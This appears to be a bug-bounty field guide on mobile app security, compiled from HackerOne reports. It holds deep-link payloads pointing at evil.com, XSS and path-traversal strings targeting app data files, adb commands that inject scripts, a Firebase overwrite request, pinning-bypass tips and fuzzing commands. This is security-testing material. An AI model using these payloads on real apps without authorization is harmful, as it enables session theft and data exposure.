`view` · `url` · `diff` · `navigation_bar_title` · `id` · `raw_json` · `include_zero_rate` · `settings_version` · `ro` · `auth_token` · `session` · `screenType` · `report_id` · `text_query` · `sort_type` · `sort_direction` · `limit` · `page` · `path` · `name`

### [Grab Android/iOS] Insecure deeplink leads to sensitive information disclosure

`#401793` · Grab · $0 · high · 2019-03-15 · ▲552
> A deeplink feature was found missing validation that led to sensitive information disclosure. Once triggered, the deeplink would direct users to load any attacker-controlled URL within a webview. The impact was further escalated as the webview contain sensitive information. A temporary patch was distributed shortly after the submission was verified and a permanent patch was released and completely rolled out soon after.

### Multiple bugs leads to RCE on TikTok for Android

`#1065500` · TikTok · $0 · critical · 2021-03-17 · ▲371
> A series of WebView vulnerabilities were found including XSS which could have potentially led an attacker to achieve remote code execution. We thank @dphoeniixx for reporting this to our team and verifying the resolution!

### AWS bucket leading to iOS test build code and configuration exposure

`#404822` · Slack · $1,500 · critical · 2019-02-23 · ▲321
> @kiyell discovered an open AWS bucket which hosted the source code of the iOS test application, as well as some configuration information and test data relating to that test build. No customer data was exposed or at risk, and we resolved and investigated this issue. Thank you @kiyell for a neat finding!

### Periscope android app deeplink leads to CSRF in follow action

`#583987` · X / xAI · $1,540 · low · 2020-02-21 · ▲224
> This issue is mainly in the Periscope Android app against CSRF follow action using deeplink.

### [PayPal Android] Remote theft of user session using push_notification_webview deeplink

`#424443` · PayPal · $0 · medium · 2019-02-07 · ▲188
> A deeplink feature built into the PayPal Android application failed to validate the requested endpoint. A specifically crafted request from a website or separate app on the device could call the deeplink and direct traffic to any destination. While the impact was limited by compensating controls, headers containing sensitive data could be collected by a malicious actor.

## Companion methodology (complete, deduplicated)

Full text of every non-SKILL.md methodology document from the contributing skills.

### Companion: hunting / references/payloads.md

# Mobile Application Security — HackerOne field guide — Payload reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete payload.

---

## Payloads & probes



- Deep link -> `app://open?url=https://evil.com` `app://webview?url=javascript:...`

- WebView -> `addJavascriptInterface` abuse

- Backup -> extract shared_prefs / Keychain



## Payload fragments observed



Recurring payloads from this class's writeups. Adapt, don't paste blindly.



| Seen | Fragment |

|---:|---|

| 2× | `www.pscp.tv/<user-id>/follow` |

| 2× | `<meta>` |

| 2× | `../../../lib-1/libjnigraphics.so` |

| 1× | `) could lead that an arbtrary URL was opened in a built-in browser in activity` |

| 1× | `pscp://user/<user-id> or pscpd://user/<user-id>` |

| 1× | `and be the connected to the Grab account on Android app) - or you can use my test number` |

| 1× | `<script>alert('Javascript is executed.')</script>` |

| 1× | `alert()` |

| 1× | `DELETE /api/v1/logout HTTP/1.1 / authorization: Bearer atkn_********************************** / Host: accounts.shopify.com / Connection: cl` |

| 1× | `GET /oauth/userinfo HTTP/1.1 / Accept-Encoding: gzip, deflate / authorization: Bearer *************** / ....` |

| 1× | `adb shell / am start -n com.quora.android/com.quora.android.ActionBarContentActivity -e url 'http://test/test' -e html 'XSS<script>alert(123` |

| 1× | `am start -n com.quora.android/com.quora.android.ModalContentActivity -e url 'http://test/test' -e html '<script>alert(QuoraAndroid.getClipbo` |

| 1× | `Intent i = new Intent(); / i.setComponent(new ComponentName("com.quora.android","com.quora.android.ActionBarContentActivity")); / i.putExtra` |

| 1× | `HTTP/1.1 400 Bad Request / Content-Encoding: gzip / Content-Type: application/json; charset=utf-8 / Date: Tue, 31 Jan 2017 17:45:43 GMT / X-` |

| 1× | `ImageList.fetchImageInfo(..)` |

| 1× | `<script> / location="https://www.google.com/search?q=</title><h1><marquee><s>Injection<!--" / </script>` |

| 1× | `<body> / <a href="intent://app/feedback#Intent;scheme=mymos;package=█████████;S.URL=javascript:(function() { alert('XSS by Cleanchain') })()` |

| 1× | `../../../../../../../data/data/jp.naver.line.android/files/something` |

| 1× | `getLastPathSegment()` |

| 1× | `file:///data/data/com.attacker/x/x/x/x/..%2F..%2F..%2F..%2Fsdcard%2Fprefs.xml` |



## Parameters observed



`view` · `url` · `diff` · `navigation_bar_title` · `id` · `raw_json` · `include_zero_rate` · `settings_version` · `ro` · `auth_token` · `session` · `screenType` · `report_id` · `text_query` · `sort_type` · `sort_direction` · `limit` · `page` · `path` · `name`



## Wordlists



Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.



| File | Entries |

|---|---:|

| `~/.local/share/hackerone-reports/wordlists/paths_mobile.txt` | 77 |

| `~/.local/share/hackerone-reports/wordlists/params_mobile.txt` | 35 |

| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |

| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |



```sh

W=~/.local/share/hackerone-reports/wordlists

ffuf -u https://target/FUZZ -w $W/paths_mobile.txt \

     -mc all -fc 404 -fs 0 -rate 40

ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_mobile.txt \

     -mr 'canary|error|invalid|not found' -rate 40

```



## Nuclei



Nuclei only sees the backend. Decompile the app and test deep links, WebViews, and local storage manually.



```sh

nuclei -u https://target -tags android,ios \

       -severity low,medium,high,critical -rl 40 -o nuclei_mobile.txt

nuclei -u https://target -t ~/nuclei-templates/http/misconfiguration \

       -rl 40 -o nuclei_mobile_misconfiguration.txt

# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'

```



Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.

### Companion: hunting / references/techniques.md

# Mobile Application Security — HackerOne field guide — Technique reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete technique.

---

## Quick wins



Start here. These are the highest-yield tests for this class.



- Decompile and inspect exported components and URL schemes.

- Test deep links for auth bypass, open redirect, and token leakage.

- Check local storage, logs, backups, and clipboard for secrets.

- Intercept traffic and test certificate pinning bypass.

- Look for insecure WebViews and JS bridges.



## Bypass tricks



- Bypass pinning with Frida/Objection.

- Use dynamic instrumentation for root/jailbreak checks.



## Deeper checklist



- Decompile and inspect exported activities/services/receivers and URL schemes.

- Test deep links for auth bypass, open redirect, and token leakage.

- Check local storage, logs, backups, and clipboard for secrets.

- Intercept traffic and test certificate pinning bypass.

- Look for insecure WebViews and JS bridges.

- Verify server-side impact, not just client behavior.



## Techniques from real reports



One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.



- **[Grab Android/iOS] Insecure deeplink leads to sensitive information disclosure** — `#401793` · Grab · $0 · ▲552

  > I've found a set of possible deeplinks, one of them ( ) could lead that an arbtrary URL was opened in a built-in browser in activity using that code (should be used in an external browser/messenger)

- **Periscope android app deeplink leads to CSRF in follow action** — `#583987` · X / xAI · $1,540 · ▲224

  > + It means we can use ` pscp://user/<user-id or pscpd://user/<user-id `

- **[PayPal Android] Remote theft of user session using push_notification_webview deeplink** — `#424443` · PayPal · $0 · ▲188

  > A deeplink feature built into the PayPal Android application failed to validate the requested endpoint.

- **1 click Account takeover via deeplink in [com.kayak.android]** — `#1667998` · KAYAK · $0 · ▲173

  > https://fluidattacks.com/blog/account-takeover-kayak/

- **[Venmo Android] Remote theft of user session** — `#401940` · PayPal · $0 · ▲151

  > Khilly highlighted a logic flaw in the Venmo app’s use of `android.net.Uri` parser, which we further explored together.

- **[Information Disclosure] Amazon S3 Bucket of Shopify Ping (iOS) have public access of other users image** — `#1021906` · Shopify · $2,900 · ▲135

  > Back to Shopify Store as Customer and inspect the website code, you will find the URL of image ██████████ https://ping-api-production.s3.us-west-2.amazonaws.com/oks██████

- **Changing email address on Twitter for Android unsets "Protect your Tweets"** — `#472013` · X / xAI · $2,940 · ▲119

  > (Add details for how we can reproduce the issue)

- **Possible to steal any protected files on Android** — `#377107` · ownCloud · $750 · ▲115

  > You can bypass the verification using specifying an alternative path: `/data/user/0/com.owncloud.android/`

- **Disclosure of all uploads to Cloudinary via hardcoded api secret in Android app** — `#351555` · Reverb.com · $0 · ▲96

  > Also this url https://api.cloudinary.com/v1 1/reverb/usage discloses statistics regarding stored files

- **Twitter lite(Android): Vulnerable to local file steal, Javascript injection, Open redirect** — `#499348` · X / xAI · $0 · ▲95

  > To reproduce javascript injection: adb shell am start -n com.twitter.android.lite/com.twitter.android.lite.TwitterLiteActivity -d "javascript://example.com%0A alert(1);"

- **Unsafe deserialization leads to token leakage in PayPal & PayPal for Business [Android]** — `#453791` · PayPal · $0 · ▲93

  > https://blog.oversecured.com/Exploiting-memory-corruption-vulnerabilities-on-Android/

- **Bypass of biometrics security functionality is possible in Android application (com.shopify.mobile)** — `#637194` · Shopify · $500 · ▲90

  > `adb shell am start -n com.shopify.mobile/com.shopify.mobile.lib.app.DeepLinkActivity -d 'https://www.shopify.com/admin/products'`

- **MetaMask Browser URL and Transaction Origin Spoofing - Metamask wallet Android & Metamask wallet iOS** — `#1751333` · MetaMask · $0 · ▲87

  > @renekroka and @hackerontwowheels from the talented team at [UGWST](https://ugwst.com/) discovered a bug that prevented the MetaMask Mobile browser from correctly updating the domain of the browser tab after a redirect.

- **Grammarly Keyboard for Android <4.1  leaks user input through logs (except for sensitive input fields)** — `#462416` · Superhuman (formerly Grammarly) · $0 · ▲84

  > @homelander identified that Grammarly for Android (on Android <4.1) was leaking user-entered text to device logs.

- **Domain highlighting on External link warning is not working on Chrome & Microsoft Edge browsers on Mobile** — `#2553026` · HackerOne · $0 · ▲82

  > - https://google.com@1234567890/download/safest file: Browsers automatically convert decimal to IP address.

- **Grammarly Keyboard for Android "Authorization Code with PKCE" flow implementation vulnerability that allows account takeover** — `#824931` · Superhuman (formerly Grammarly) · $0 · ▲76

  > @tomtenisse identified a vulnerability in Grammarly Keyboard for Android that allowed malicious application installed on the device to guess the PKCE code verifier value and consequently obtain access to OAuth access token (`grauth` cookie).

- **[Zomato Android/iOS] Theft of user session** — `#328486` · Eternal · $0 · ▲68

  > When any WebView (in a client app, or a browser) meets a URL it will automatically launch Zomato app.

- **Authorization bypass using login by phone option+horizontal escalation possible on Grab Android App** — `#205000` · Grab · $0 · ▲68

  > So, I found the endpoint using android app `https://p.grabtaxi.com/api/passenger/v2/profiles/activationsms` which allow me to bypass OTP code due to lack of rate limiting.

- **Persistant Arbitrary code execution in mattermost android** — `#1115864` · Mattermost · $0 · ▲67

  > On the next launch of the app the malicious code will be executed.In this poc the app will crash on next launch because i was too lazy and to create a modified version of `libyoga.so`

- **URL Scheme Validation Bypass in Shopify Mobile App Allows Javascript Execution** — `#1737358` · Shopify · $0 · ▲65

  > It was found that the com.shopify.mobile app doesn't validate the scheme of the url given as an extra parameter to the com.shopify.mobile.navigation.NavigationActivity which may allow the loading of arbitrary html content (including js code) in the…

- **MetaMask Browser (on Android) does not enforce Content-Security-Policy header** — `#1941767` · MetaMask · $0 · ▲64

  > Notice how our javascript `<script alert('Javascript is executed.')</script ` is blocked by the browser (Chrome in this example):

- **Insufficient session expiration in the **com.shopify.ping** android app** — `#1172205` · Shopify · $0 · ▲63

  > More specifically, after the user provides the required credentials, an access token will be fetched from the server at accounts.shopify.com/oauth/token.

- **Default Nextcloud Server and Android Client leak sharee searches to Nextcloud** — `#1167916` · Nextcloud · $750 · ▲58

  > https://github.com/nextcloud/server/blob/master/apps/files sharing/lib/Controller/ShareesAPIController.php L144

- **Firebase Database Takeover in Zego Sense Android app** — `#1065134` · Zego · $0 · ▲58

  > reponse = requests.put("https://api-project-615509201590.firebaseio.com/.json", json=data)

- **bypass two-factor authentication in Android apps and web** — `#1747978` · TikTok · $0 · ▲55

  > It was found that this vulnerability required access to the user's email/password or phone number/code associated with the account and multiple bruteforcing attempts to bypass would be needed.

- **Insecure Storage and Overly Permissive  API Keys in Android App** — `#753868` · Zenly · $750 · ▲52

  > You can also create server-side filters to help prevent this thing from happening.

- **[Zomato for Business Android] Vulnerability in exported activity WebView** — `#537670` · Eternal · $0 · ▲52

  > Since the following activity `com.application.zomatomerchant.home.HomeSalt` has `exported="true"` it can be exploited by another application.

- **[Android] Directory traversal leading to disclosure of auth tokens** — `#1378889` · Slack · $3,500 · ▲50

  > In order to take advantage of this vulnerability, attackers needed to be in a workspace with the user and to induce a user to click on a file uploaded to Slack exceeding 1MB (files smaller than 1MB are not downloaded to the device and therefore do not present…

- **[Android] XSS via start ContentActivity** — `#189793` · Quora · $0 · ▲50

  > Using intent extra parameter `html` we can pass javascript, which will be executed in the context of www.quora.com.

- **iOS Brave Playlist "Open in Private Tab" bypasses FaceID requirement for Private Tabs** — `#3693295` · Brave Software · $0 · ▲49

  > Adding/Opening a song in your Brave playlist and holding for the option of "Open in new Private Tab" bypasses FaceID/Passcode Requirement for Private Tabs.



## Case studies



### [Grab Android/iOS] Insecure deeplink leads to sensitive information disclosure

`#401793` · Grab · $0 · high · 2019-03-15 · ▲552

> A deeplink feature was found missing validation that led to sensitive information disclosure. Once triggered, the deeplink would direct users to load any attacker-controlled URL within a webview. The impact was further escalated as the webview contain sensitive information. A temporary patch was distributed shortly after the submission was verified and a permanent patch was released and completely rolled out soon after.



### Multiple bugs leads to RCE on TikTok for Android

`#1065500` · TikTok · $0 · critical · 2021-03-17 · ▲371

> A series of WebView vulnerabilities were found including XSS which could have potentially led an attacker to achieve remote code execution. We thank @dphoeniixx for reporting this to our team and verifying the resolution!



### AWS bucket leading to iOS test build code and configuration exposure

`#404822` · Slack · $1,500 · critical · 2019-02-23 · ▲321

> @kiyell discovered an open AWS bucket which hosted the source code of the iOS test application, as well as some configuration information and test data relating to that test build. No customer data was exposed or at risk, and we resolved and investigated this issue. Thank you @kiyell for a neat finding!



### Periscope android app deeplink leads to CSRF in follow action

`#583987` · X / xAI · $1,540 · low · 2020-02-21 · ▲224

> This issue is mainly in the Periscope Android app against CSRF follow action using deeplink.



### [PayPal Android] Remote theft of user session using push_notification_webview deeplink

`#424443` · PayPal · $0 · medium · 2019-02-07 · ▲188

> A deeplink feature built into the PayPal Android application failed to validate the requested endpoint. A specifically crafted request from a website or separate app on the device could call the deeplink and direct traffic to any destination. While the impact was limited by compensating controls, headers containing sensitive data could be collected by a malicious actor.



## Query the corpus



```sh

python3 ~/.local/share/hackerone-reports/h1.py search "<keyword>" --class mobile --limit 20

python3 ~/.local/share/hackerone-reports/h1.py stats --class mobile

python3 ~/.local/share/hackerone-reports/h1.py show <id> --full

```



Search by technology, endpoint, parameter, or program. Examples:



```sh

python3 ~/.local/share/hackerone-reports/h1.py search "wordpress" --class mobile

python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class mobile --min-bounty 1000

```

## Corpus wordlists (mined)

### `params_mobile.txt`

```text
view
url
diff
navigation_bar_title
id
raw_json
include_zero_rate
settings_version
ro
auth_token
session
screenType
report_id
text_query
sort_type
sort_direction
limit
page
path
name
search
usp
feature
sr_detail
expand_srs
from_detail
api_type
always_show_media
request_timestamp
token
package_name
product_id
correlation_id
mt
dl
```

### `paths_mobile.txt`

```text
/data/data/
/passenger/passenger.html
/follow
/reference/android/support/v4/content/LocalBroadcastManager.html
/settings
/edited/page2.html
/blog/account-takeover-kayak/
/oks██████
/data/user/0/com.owncloud.android/
/v1_1/reverb/usage
/en/manual/products
/admin/products
/download/safest_file
/api/passenger/v2/profiles/activationsms
/api/passenger/v2/profiles/activate
/cspmeta.php
/web3attack.php
/cspheader.php
/oauth/userinfo
/api/v1/logout
/.json
/test
/odt
/api/passenger/v2/profiles/edit
/HEAD/docs/security/url_display_guidelines/url_display_guidelines.md
/chromium/src/+/HEAD/docs/security/url_display_guidelines/url_display_guidelines.md
/brave
/api/v2/gold/android/verify_purchase
/1.1/help/settings.json
/security/chromiumwebview/cve-2020-6506-keypress-2.html
/security/chromiumwebview/cve-2020-6506.html
/2020/06/stable-channel-update-for-desktop_15.html
/x/x/x/x/
/data/data/com.irccloud.android/shared_prefs/prefs.xml
/data/data/com.irccloud.android/cache/
/data/data/com.attacker/sdcard/prefs.xml
/iOS
/data/data/com.evernote/lib-1/libjnigraphics.so
/data/data/com.evernote/cache/preview/:UUID/
/documentation/webkit/wkpreferences
/data/data/pwn.pwn/
/data/data/com.exness.android.pa/app_webview/Cookies
/r/
/data/data/pwn.pwn/pwn.html
/data/data/com.nextcloud.client
/data/data/com.nextcloud.client/shared_prefs/com.nextcloud.client_preferences.xml
/storage/emulated/0/Android/media/com.nextcloud.client
/data/data/com.quora.android/app_webview/Cookies
/cloudflare-one/connections/connect-devices/warp/warp-settings/
/guide/topics/manifest/intent-filter-element.html
/google_login_auth
/api/v2/users/google_login_auth
/s/zionksi1pt7lot5/Coinbase-Android.mov
/data/user/0/com.nextcloud.client/
/data/data
/data/user/0/
/reference/android/content/BroadcastReceiver.html
/oauth/token
/security/threat-model/
/data/data/co.vine.android/databases/webview.db
/tools/drozer/
/xxxx
/blob.html
/community/metasploit/blog/2015/01/02/2014-a-year-of-android-exploits-in-metasploit
/cve/CVE-2013-4710/
/apn-unregister
/driver_invitations
/referrals/
/urlschemes/facetime.html
/data/definitions/926.html
/sdcard/Android/media/com.nextcloud.client/nextcloud/ACCOUNT/
/in/app/brave-web-browser/id1052879175
/aas.do
/metrics
/s/acvr4g7lv63tti5/runtime%20manipulation%20coinbase.mov
/portal/visitor-log/
/stream
```

## Source skills merged into this topic

- `h1skills` — `hackerone-mobile`
- `hunting` — `mobile`

## Provenance

- `references/unified-method.md` — same deduplicated union as this file, for tooling
- `references/upstream-*.md` — unmodified original SKILL.md from each repo
- `references/upstream-assets/` — 2 companion files
- `../../upstream/` — complete unmodified archives of all five source repositories
- `bbhunt-methodology` — orchestrator, state machine and class router
